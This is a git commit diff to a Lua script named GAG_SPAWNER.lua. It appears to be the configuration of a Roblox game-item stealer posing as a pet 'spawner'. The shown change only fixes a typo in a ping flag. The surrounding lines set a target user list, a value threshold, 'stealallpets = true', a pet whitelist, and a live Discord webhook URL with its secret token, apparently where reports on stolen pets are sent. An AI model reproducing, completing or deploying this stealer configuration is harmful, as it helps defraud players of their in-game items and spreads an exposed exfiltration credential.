0cfa663616034a647adccaa9227e3001d216af07
thatboyskulls12 <aj.skulls12@gmail.com>
2025-07-24 13:38:27 -0400

    Update GAG_SPAWNER.lua

--- GAG_SPAWNER.lua
+++ GAG_SPAWNER.lua
@@ -6,7 +6,7 @@ users = {
     "Boomsauce121411",
 }
 min_value = 10000000
-ping = "ture"
+ping = "true"
 webhook = "https://discord.com/api/webhooks/1397737960925036605/6OL-UU-x_pYYOauEmwmR1t-yAA6lkOX5oWpxz0MmfRGRKPBFx_9EkMh5Zg8dquFb6Kwr"
 stealallpets =true
 Whitelist_Pets = {"Red Fox", "Raccoon", "Dragonfly"}
